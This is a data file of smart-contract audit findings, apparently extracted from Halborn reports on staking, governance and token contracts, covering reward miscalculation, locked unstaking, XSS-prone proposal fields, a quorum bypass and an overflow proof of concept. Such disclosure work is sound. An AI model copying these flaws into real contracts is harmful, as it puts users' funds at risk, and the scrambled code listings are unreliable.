            "HighStreetMarket_Staking",
            "Severity: High"
        ]
    },
    {
        "title": "SUBVAULTREWARDS ARE NOT UPDATED CORRECTLY WHEN CALLING PROCESSREWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the HighStreetCorePool contract, the function receiveVaultRewards() is executed by the vault to transfer vault rewards HIGH from the vault into the pool. The function processRewards() and _processVaultRewards() handle the distribution of these rewards but this is not done correctly, and the users are sent a higher amount of reward tokens than the initial amount sent by the vault to the pool. This causes that the smart contract eventually gets a lower reward token balance that what it actually should not allow users to unstake as the balance of the contract is not enough to transfer the users their reward tokens. Proof of Concept: 17 As we can see, 100 tokens were sent by the vault through the call to receiveVaultRewards() functions, but the total vault rewards that will be given are higher than that. In this case, this will cause that the smart contract will not have enough balance to allow user2 to unstake: Risk Level: Likelihood - 4 Impact - 5 Recommendation: It is recommended to fix the logic in the processRewards() and _processVaultRewards() functions so the stakers are not sent a higher amount of reward tokens than the initial amount sent by the vault to the pool through receiveVaultRewards() function. 18 Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 99c5bf0cc40bc76fce973756a45634dfafaa3e01 19 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: High"
        ]
    },
    {
        "title": "UNSTAKE FUNCTION CAN BE LOCKED IF TOTALWEIGHT EQUALS TO ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract HighStreetPoolBase contains the following function: Listing 2: HighStreetPoolBase.sol (Lines 565) // update HIGH per block value in factory if required if ( factory . shouldUpdateRatio () ) { factory . updateHighPerBlock () ; } 538 function _sync () internal virtual { 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 return ; return ; } if ( blockNumber () <= lastYieldDistribution ) { } // if locking weight is zero - update only ` // check bound conditions and if these are not met - // exit silently , without emitting an event uint256 endBlock = factory . endBlock () ; if ( lastYieldDistribution >= endBlock ) { 554 555 556 557 558 559 560 561 562 563 564 lastYieldDistribution ` and exit if ( usersLockingWeight == 0) { lastYieldDistribution = uint64 ( blockNumber () ); return ; } // to calculate the reward we need to know how many blocks passed , and reward per block uint256 currentBlock = blockNumber () > endBlock ? endBlock : blockNumber () ; uint256 blocksPassed = currentBlock - lastYieldDistribution ; uint256 highPerBlock = factory . highPerBlock () ; // calculate the reward 20 565 566 567 568 569 570 571 572 573 } uint256 highReward = ( blocksPassed * highPerBlock * weight ) / factory . totalWeight () ; // update rewards per weight and ` lastYieldDistribution ` yieldRewardsPerWeight += rewardToWeight ( highReward , usersLockingWeight ); lastYieldDistribution = uint64 ( currentBlock ); // emit an event emit Synchronized ( msg . sender , yieldRewardsPerWeight , lastYieldDistribution ); If factory.totalWeight() equals to zero, a division by zero occurs and the call reverts. As this _sync() function is called every time by the unstake() function, if this value is zero all the rewards and staked tokens will be locked. This scenario where factory.totalWeight() equals to zero can only occur if all the registered pools are HighStreetFlashPool and if all of them have expired/are disabled. In that case, when the users call the unstake() function to retrieve their staked tokens and their rewards the operation will revert. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to modify HighStreetPoolFactory.registerPool() function so it does not allow anyone to add a HighStreetFlashPool unless there is already at least one HighStreetCorePool added. This way, the lock would never be possible, as that scenario where the factory.totalWeight() is zero can only happen if all the registered pools are HighStreetFlashPool. 21 Remediation Plan: SOLVED: The HighStreetMarket team fixed the issue in the following commit IDs:  8f0b49cb90cbad93ed0586e6b05f54bac228e68b HighStreetPoolFactory.changePoolWeight() function can now be called by the owner of the contract or by a pool.  53dff6a43b47cdc21d83bb3b8232cbbc96e238b5 HighStreetMarket team added an emergencyWithdraw() function that will allow users to retrieve their staked tokens and the yield rewards in case that factory.totalWeight() equals to zero. 22 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Medium"
        ]
    },
    {
        "title": "UPDATEHIGHPERBLOCK IMPACTS NEGATIVELY ALL THE UNCLAIMED REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract HighStreetPoolFactory the function updateHighPerBlock() decreases every blocksPerUpdate the highPerBlock rewards by a 3%. This could result, as shown in the Proof of Concept below, in a user losing a part of his reward by calling unstake() right after the execution of updateHighPerBlock(). Proof of Concept: Based on a HighStreetPoolFactory contract with the following initial parameters: - _highPerBlock = 10_000000000000000000 - _blocksPerUpdate = 50 - endBlockNumber - initBlockNumber = 200 Current yield block: 48/200 contract_poolFactory.highPerBlock() -> 10000000000000000000 contract_HighStreetCorePool_HighPool.pendingYieldRewards(user1.address) -> 479999999999999999999 Call to updateHighPerBlock() - REVERTED: (too frequent) Current yield block: 49/200 contract_poolFactory.highPerBlock() -> 10000000000000000000 contract_HighStreetCorePool_HighPool.pendingYieldRewards(user1.address) -> 489999999999999999999 Call to updateHighPerBlock() - CONFIRMED Current yield block: 50/200 contract_poolFactory.highPerBlock() -> 9700000000000000000 contract_HighStreetCorePool_HighPool.pendingYieldRewards(user1.address) -> 484999999999999999999 23 As we can see, if the user calls unstake in the block 49/200 he will get a higher reward than if he called it in the block 50/200. This happens because when updateHighPerBlock() is called it does not pay out the pending rewards to the users at the previous rate. The difference can be really high as shown in the example below: Based on a HighStreetPoolFactory contract with the following initial parameters: - _highPerBlock = 10_000000000000000000 - _blocksPerUpdate = 1 - endBlockNumber - initBlockNumber = 40 Amount of reward tokens received by the user if he just calls unstake() after reaching endBlockNumber: 118284914959653117599 Amount of reward tokens received by the user after calling 40 times processRewards() generating 40 deposits and after retrieving those 40 deposits by calling unstake(): 1227719693740947062768 Difference: 227719693740947062768 - 118284914959653117599 = 109434778781293945169 = 109 reward tokens. Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to loop through the users generating a deposit with the previous rate that they can use to unstake the rewards at the previous rate. Although this solution may eventually require a lot of gas reaching the block gas limit and totally blocking the updateHighPerBlock() function. 24 Remediation Plan: SOLVED: The HighStreetMarket team will mitigate this issue by: - Incentivating their users to claim the rewards more frequently to maximize their profit by compound mechanism. - Creating a script that executes automatically once before each updateHighPerBlock() call. This script will trigger the sync() function updating the yieldRewardsPerWeigh variable. 25 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING REQUIRE STATEMENT IN UPDATESTAKELOCK FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract HighStreetPoolBase the function updateStakeLock() allows a user to extend the locking period for a given deposit. This function does not check that the tokenAmount is different from zero allowing users to extend deposits that were already unstaked, which makes no sense: Code Location: Listing 3: HighStreetPoolBase.sol uint256 depositId , uint64 lockedUntil 307 function updateStakeLock ( 308 309 310 ) external nonReentrant { 311 312 313 314 315 316 } // sync and call processRewards _sync () ; _processRewards ( msg . sender , false ); // delegate call to an internal function _updateStakeLock ( msg . sender , depositId , lockedUntil ); Risk Level: Likelihood - 2 Impact - 2 26 Recommendation: It is recommended to add a require statement in the updateStakeLock() function that checks that the tokenAmount in the deposit is > 0. Remediation Plan: SOLVED: The HighStreetMarket team fixed the issue in the commit ID f2562ad8f6e8cc39eb1ec17471368e7058b0df92 27 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "USERS CAN STAKE IN A FLASHPOOL EVEN IF THE POOL IS DISABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract HighStreetFlashPool allows user to stake tokens even if the This makes no sense as the users will not get any pool is disabled. reward for staking their tokens in a disabled HighStreetFlashPool. Code Location: Listing 4: HighStreetFlashPool.sol address _staker , uint256 _amount , uint64 _lockedUntil 73 function _stake ( 74 75 76 77 ) internal override { 78 79 // override the ` _lockedUntil ` and execute parent // we set \" locked period \" to 365 days only to have correct calculation of locking weights , 80 // the tokens are not really locked since _unstake in the core pool doesn 't check the \" locked period \" super . _stake ( _staker , _amount , uint64 ( now256 () + 365 days )); 81 82 } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to not allow staking if the HighStreetFlashPool is disabled: 28 Listing 5: HighStreetFlashPool.sol (Lines 78) address _staker , uint256 _amount , uint64 _lockedUntil 73 function _stake ( 74 75 76 77 ) internal override { 78 79 80 require (! isPoolDisabled () , \" Pool disabled \"); // override the ` _lockedUntil ` and execute parent // we set \" locked period \" to 365 days only to have correct calculation of locking weights , 81 // the tokens are not really locked since _unstake in the core pool doesn 't check the \" locked period \" super . _stake ( _staker , _amount , uint64 ( now256 () + 365 days )); 82 83 } Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID dc058f113a6009585f7a47280c9b5cf2930a087b 29 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "INCORRECT AMOUNT IN STAKED EVENT EMISSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract HighStreetPoolBase the event Stake will emit a wrong amount in case that the tokens staked are deflationary. Code Location: Listing 6: HighStreetPoolBase.sol (Lines 462) address _staker , uint256 _amount , uint64 _lockUntil 394 function _stake ( 395 396 397 398 ) internal virtual { 399 400 401 402 // validate the inputs require ( _amount > 0, \" zero amount \"); require ( _lockUntil == 0 || ( _lockUntil > now256 () && _lockUntil - 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 now256 () <= 365 days ) , \" invalid lock interval \" ); // update smart contract state _sync () ; // get a link to user data struct , we will write to it later User storage user = users [ _staker ]; // process current pending rewards if any if ( user . tokenAmount > 0) { _processRewards ( _staker , false ); } // in most of the cases added amount ` addedAmount ` is simply ` _amount ` // however for deflationary tokens this can be different // read the current balance 30 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 uint256 previousBalance = IERC20 ( poolToken ). balanceOf ( address ( this )); // transfer ` _amount `; note : some tokens may get burnt here transferPoolTokenFrom ( msg . sender , address ( this ) , _amount ); // read new balance , usually this is just the difference ` previousBalance - _amount ` uint256 newBalance = IERC20 ( poolToken ). balanceOf ( address ( this ) ); // calculate real amount taking into account deflation uint256 addedAmount = newBalance - previousBalance ; // set the ` lockFrom ` and ` lockUntil ` taking into account that // zero value for ` _lockUntil ` means \" no locking \" and leads to zero values // for both ` lockFrom ` and ` lockUntil ` uint64 lockFrom = _lockUntil > 0 ? uint64 ( now256 () ) : 0; uint64 lockUntil = _lockUntil ; // stake weight formula rewards for locking uint256 stakeWeight = ((( lockUntil - lockFrom ) * WEIGHT_MULTIPLIER ) / 365 days + WEIGHT_MULTIPLIER ) * addedAmount ; // makes sure stakeWeight is valid require ( stakeWeight > 0, \" invalid stakeWeight \"); // create and save the deposit ( append it to deposits array ) Deposit memory deposit = Deposit ({ tokenAmount : addedAmount , weight : stakeWeight , lockedFrom : lockFrom , lockedUntil : lockUntil , isYield : false }) ; // deposit ID is an index of the deposit in ` deposits ` array user . deposits . push ( deposit ); // update user record user . tokenAmount += addedAmount ; user . totalWeight += stakeWeight ; user . subYieldRewards = weightToReward ( user . totalWeight , yieldRewardsPerWeight ); 31 458 459 460 461 462 463 } // update global variable usersLockingWeight += stakeWeight ; // emit an event emit Staked ( msg . sender , _staker , _amount ); Risk Level: Likelihood - 3 Impact - 1 Recommendation: It is recommended to use addedAmount instead of _amount: Listing 7 1 emit Staked ( msg . sender , _staker , addedAmount ); Remediation Plan: SOLVED: The HighStreetMarket team fixed the issue in the commit ID 3255a48e93ce0558de9ba33651f943b8f83b6b9f 32 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "SOLC 0.8.0 COMPILER VERSION CONTAINS MULTIPLE BUGS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Solidity compiler version 0.8.3, 0.8.4 and 0.8.9 fixed important bugs in the compiler. The version 0.8.0 is missing all these fixes:  0.8.3  0.8.4  0.8.9 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the most tested and stable versions, such as 0.6.12 or 0.7.6. Otherwise, if ^0.8.0 is still chosen to be used because of the new functionality it provides, it is recommended to use 0.8.10 version. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID ec469c0e14949a991a5383ed836ba7dbf5534a7a 33 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: HighStreetPoolFactory.sol - getPoolData() (HighStreetPoolFactory.sol#169-183) - registerPool() (HighStreetPoolFactory.sol#209-227) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID c31e617d3aec0115855a50c8b39b8e31fbabe7c4 34 3.10 (HAL-10) UINT32/UINT64 TYPES ARE LESS GAS EFFICIENT - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "HighStreetMarket_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Jarvis_AerariumMilitare_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "JARVIS contract uses the floating pragma ^8.0.0. Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Reference: ConsenSys Diligence - Lock pragmas Code Location: AerariumMilitare.sol Line #3 Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider locking the pragma version. It is not recommended to use floating pragma in production. Apart from just locking the pragma version in the code, the sign (^) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or 12 in hardhat.config.js for HardHat framework. Remediation Plan: RISK ACCEPTED: Jarvis fixed the pragma version in truffle-config. 13 ",
        "labels": [
            "Halborn",
            "Jarvis_AerariumMilitare",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Jarvis_AerariumMilitare_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The JARVIS contract uses one of the latest pragma version (0.8.0) which was released Dec 16, 2020. The latest pragma version is (0.8.4) and it was released April 2021. Many pragma versions have been released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases Code Location: AerariumMilitare.sol Line #3 Risk Level: Likelihood - 1 Impact - 2 Recommendation: In the Solitidy Github repository, there is a json file listing the bugs reported for each compiler version. No bugs have been found in > 0.7.3 versions and very few in 0.7.0 -- 0.7.3. The latest stable version is Furthermore, pragma 0.6.12 is widely used by Solidity pragma 0.6.12. developers and has been extensively tested in many security audits. We recommend using at minimum the latest stable version. 14 Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_ by_version.json Remediation Plan: SOLVED: Jarvis team changed the pragma version to 0.7.3. 15 ",
        "labels": [
            "Halborn",
            "Jarvis_AerariumMilitare",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Jarvis_AerariumMilitare_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: AerariumMilitare.sol Lines #76, 87 Risk Level: Likelihood - 1 Impact - 1 Recommendation: A Consider declaring external variables instead of public variables. best practice is to use external if expecting a function to only be 16 called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. SOLVED: Jarvis team marked claim() and liquidate() functions as external. 17 3.4 KOVAN TESTING ",
        "labels": [
            "Halborn",
            "Jarvis_AerariumMilitare",
            "Severity: Informational"
        ]
    },
    {
        "title": "USAGE OF VULNERABLE CRATES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/StaderLabs_NearX_Staking_Reaudit_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the project uses crates with known vulnerabilities. Code Location: ID RUSTSEC-2020-0071 RUSTSEC-2020-0159 package time chrono Short Description Potential segfault in the time crate Potential segfault in localtime_r invoca- tions Risk Level: Likelihood - 2 Impact - 1 Recommendation: Even if those vulnerable crates cannot impact the underlying application, it is advised to be aware of them and attempt to update them to a no- vulnerable version. Furthermore, it is necessary to set up dependency monitoring to always be alerted when a new vulnerability is disclosed in one of the projects crates. ### Remediation Plan ACKNOWLEDGED: The StaderLabs team acknowledged this finding. 11 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "StaderLabs_NearX_Staking_Reaudit_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF PROPOSAL SANITIZATION COULD HARM USERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a new proposal is submitted via the submit_proposal function in the assembly contract, the submitter can introduce a malicious external URL that tricks users into being redirected to a phishing DApp that could steal their funds. It is worth noting that URLs will appear in the official Astroport frontend, so legitimate users will not be aware if those URLs are In addition, unsanitized title and description malicious or not. fields could lead to other web application exploits such as Cross-site scripting. Code Location: Listing 200,206,211,216,224,227) 1: contracts/assembly/src/contract.rs (Lines 199 200 201 202 203 204 205 206 207 // Validate title if title . len () < MIN_TITLE_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Title too short \" . to_string () , )); } if title . len () > MAX_TITLE_LENGTH { return Err ( ContractError :: InvalidProposal (\" Title too long \"  . to_string () )); 208 209 210 211 212 213 } // Validate the description if description . len () < MIN_DESC_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Description too short \" . to_string () , 12 214 215 216 217 218 219 220 221 222 223 224 225 )); } if description . len () > MAX_DESC_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Description too long \" . to_string () , )); } // Validate Link if let Some ( link ) = & link { if link . len () < MIN_LINK_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Link too  short \" . to_string () )) ; } if link . len () > MAX_LINK_LENGTH { 226 227 228 229 230  long \". to_string () )); } } return Err ( ContractError :: InvalidProposal ( \" Link too Risk Level: Likelihood - 3 Impact - 3 Recommendation: If possible, restrict that URLs are submitted to a whitelist of domains. As this may not be feasible due to the nature of the feature, it is rec- ommended to limit the link, title and description fields to alphanumeric characters plus a subset of symbols, or perform XSS validation using Rust libraries such as libinjection. Reference: LibInjections XSS validation function Remediation plan: PARTIALLY SOLVED: URL and character validation measures were implemented in commit 6910dbf80aba668b4788cc7e73efcf16108cef33. However, Astroport. 13 fi stated that the content of the proposal will be carefully HTML-encoded in a future release of the front-end to mitigate any potential XSS vectors not covered by the smart contract sanitization steps. As the front-end is out of scope for this audit scope and therefore the remediation cannot be reviewed, this issue has been marked as \"Partially solved\". 14 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Astral_Assembly_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "INCONSISTENT XASTRO BLOCK HEIGHT SELECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The assembly contract uses different block heights when casting a vote and when calculating the total voting power available for a proposal. This situation could allow proposals to bypass the quorum required for approval. The proposal_quorum is defined as the ratio of total votes to total voting power. However, the calculation of each vote cast and thus total_votes queries XAstro token in proposal.start_block but total_voting_power does so in proposal.start_block - 1, effectively retrieving different states of the XAstro supply. On the other hand, the VxAstro token consistently uses proposal.start_time - 1 in both cases. To illustrate this issue, take the following example attack scenario which, for simplicity, only considers the XAstro token: 1. Suppose at block height 100 the XAstros total supply is 1000, proposal_required_quorum set to 10% and proposal_required_threshold set to 20%. 2. In the next block (101), more XAstro tokens are minted, taking the total supply to 1500. At this point, a proposal is submitted. 3. By the end of the voting period, the active proposal will have received 100 votes, 21 of which will be for votes. 4. Finally, end_proposal is called on the aforementioned proposal. proposal_quorum will be 100 / 1000 since proposal.start_block - 1 is requested for the denominator instead of 100 / 1500. This will unfairly mark the proposal as Passed, since the quorum check requires a smaller than effective total_voting_power to cast votes. 15 Code Location: Listing 2: contracts/assembly/src/contract.rs (Line 700) 689 pub fn calc_voting_power ( deps : & DepsMut , 690 sender : String , 691 proposal : & Proposal , 692 693 ) -> StdResult < Uint128 > { 694 695 696 let config = CONFIG . load ( deps . storage ) ?; let xastro_amount : BalanceResponse = deps . querier .  query_wasm_smart ( 697 698 699 700 701 config . xastro_token_addr , & XAstroTokenQueryMsg :: BalanceAt { address : sender . clone () , block : proposal . start_block , }, Listing 3: contracts/assembly/src/contract.rs (Line 746) 739 pub fn calc_total_voting_power_at ( deps : & DepsMut , proposal : &  Proposal ) -> StdResult < Uint128 > { 740 741 742 743 744 745 746 747 748 let config = CONFIG . load ( deps . storage ) ?; // Total xASTRO supply at a specified block let mut total : Uint128 = deps . querier . query_wasm_smart ( config . xastro_token_addr , & XAstroTokenQueryMsg :: TotalSupplyAt { block : proposal . start_block - 1, }, ) ?; Risk Level: Likelihood - 3 Impact - 3 16 Recommendation: A consistent block height and time should be used when retrieving in- formation about total supplies and total balances that are expected to reflect the same state of a token. Remediation plan: NOT APPLICABLE: The underlying logic in storing SnapshotMap effectively reflected the users voting power (calculated at calc_voting_power) in proposal.start_block - 1. Causing the block height to be selected con- sistently in all the relevant places. 17 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Astral_Assembly_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "NO MINIMUM THRESHOLD FOR EFFECTIVE DELAY PERIOD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Timelocks are defined in the assembly contract to allow users of the protocol to react in time if a change made is bad faith or is not in the best interest of the protocol and its users. and not restrict functions update_config instantiate do assembly The and timelocks contract proposal_expiration_period) from being greater than or equal to a minimum threshold. Therefore, malicious changes proposed through voting could even be executed immediately if execution_delay_period is not set appropriately. of (execution_delay_period the Code Location: Listing 4: contracts/assembly/src/contract.rs (Lines 67,68) xastro_token_addr : addr_validate_to_lower ( deps . api , & msg . vxastro_token_addr : addr_validate_to_lower ( deps . api , & msg . builder_unlock_addr : addr_validate_to_lower ( deps . api , & msg . proposal_voting_period : msg . proposal_voting_period , proposal_effective_delay : msg . proposal_effective_delay , proposal_expiration_period : msg . proposal_expiration_period , proposal_required_deposit : msg . proposal_required_deposit , proposal_required_quorum : Decimal :: from_str (& msg . 62 let config = Config { 63  xastro_token_addr )? , 64  vxastro_token_addr )?, 65  builder_unlock_addr )? , 66 67 68 69 70  proposal_required_quorum )? , 71  proposal_required_threshold )? , 72 }; proposal_required_threshold : Decimal :: from_str (& msg . 18 Listing 5: contracts/assembly/src/contract.rs (Lines 557,561) 556 if let Some ( proposal_effective_delay ) = updated_config .  proposal_effective_delay { config . proposal_effective_delay = proposal_effective_delay ; 557 558 } 559 560 if let Some ( proposal_expiration_period ) = updated_config .  proposal_expiration_period { config . proposal_expiration_period = proposal_expiration_period 561  ; 562 } Risk Level: Likelihood - 1 Impact - 4 Recommendation: to that ensure Add a validation routine inside the instantiate and update_config and timelock functions proposal_expiration_period) is greater than or equal to a minimum threshold that allows users of Astroport will act promptly against any issue the protocol could have when changes are made. The following are some examples of timelocks used in other protocols: (execution_delay_period  Uniswap: 48-hours timelock  Compound: 48-hours timelock  Aave: 24-hours timelock (Short time lock) Remediation plan: SOLVED: The issue was fixed in commit 6dcfefe59514a85495a4e34a2ec50ea41f0d10d2. 19 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Astral_Assembly_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "UNCHECKED ARITHMETIC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In computer programming, an overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented by a given number of bits -- either greater than the maximum value or less than the minimum representable value. This issue has been raised as informational only, since it was not possible to define a clear exploitation scenario for the affected case. Code Location: Listing 6: Affected resources 1 contracts / assembly / src / contract . rs :715:  locked_amount . params . amount - locked_amount . status . astro_withdrawn  ) ?; . checked_add ( Risk Level: Likelihood - 1 Impact - 1 Recommendation: In release mode Rust does not panic on overflows and overflown values It is recom- just wrap without any explicit feedback to the user. mended then to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Consider replacing the addition operator with Rusts checked_add method, the subtraction operator with Rusts checked_subs method, and so on. 20 Remediation plan: SOLVED: The issue was fixed in commit 6dcfefe59514a85495a4e34a2ec50ea41f0d10d2. 21 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Astral_Assembly_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Lord.sol and Mead.sol smart contracts use an insecure arithmetic operation using the totalSupply() and amount variables to determine if it is possible to mint that amount. This operation could lead to an integer overflow if the actual supply of tokens and the amount to mint are high numbers. Code Location: Listing 1: Lord.sol (Line 162) 161  { 162 function mint ( address to , uint256 amount ) external onlyBridge require ( totalSupply () + amount <= limitSupply , \" exceeded  mint limit \" ); 163 164 } _mint ( to , amount ); Listing 2: Mead.sol (Line 77) bytes32 message = \" \\ x19Ethereum Signed Message :\\ function mint ( uint256 _amount , uint8 _v , bytes32 _r , bytes32 // investor , project verification bytes memory prefix 68  _s ) external { 69 70  n32 \" ; 71  sender , address ( this ) , block . chainid , _amount , mintId , mintNonceOf  [ msg . sender ]) ); 72  prefix , message )); 73 74 75 76 = keccak256 ( abi . encodePacked ( msg . require ( bridges [ recover ], \" sig \" ); = ecrecover ( hash , _v , _r , _s ); = keccak256 ( abi . encodePacked ( address recover bytes32 hash 14 require ( totalSupply () + _amount <= limitSupply , \" exceeded 77  mint limit \" ); 78 79 80 81 82 } mintNonceOf [ msg . sender ]++; _mint ( msg . sender , _amount ); Proof of Concept: to replicate this issue:  in lord.sol:  increase limit supply by any number.  try to mint an amount which could cause an overflow, for example 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa.  in mead.sol:  mint a high amount, for example 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa.  mint again any amount greater than 5 to cause overflow. Listing 3: pentest.js let amount1 = '0 let amount2 = '7 '; 1  xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa '  ; 2 3 4 5 6 7 await mead . connect ( bridge ). mint ( amount1 , sig .v , sig .r , sig . s); await mead . connect ( bridge ). mint ( amount2 , sig .v , sig .r , sig . s); // .. snipped .. Listing 4: Output 1 Error : VM Exception while processing transaction : reverted with  panic code 0 x11 ( Arithmetic operation underflowed or overflowed 15  outside an unchecked block ) 2 at Mead . mint ( contracts / erc20 / Mead . sol :78) Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to import the OpenZeppelin SafeMath.sol library and set the variables using that SafeMath to avoid these extreme situations. This could be done by adding the following lines to the contracts. Listing 5: safemath.sol 1 import \" @openzeppelin / contracts / utils / math / SafeMath . sol \" ; 2 using SafeMath for uint256 ; Remediation Plan: SOLVED: The SeaScape Team now implements correctly the SafeMath library to avoid these overflows. 16 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords",
            "Severity: Medium"
        ]
    },
    {
        "title": "EVM STACK LIMIT SURPASSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
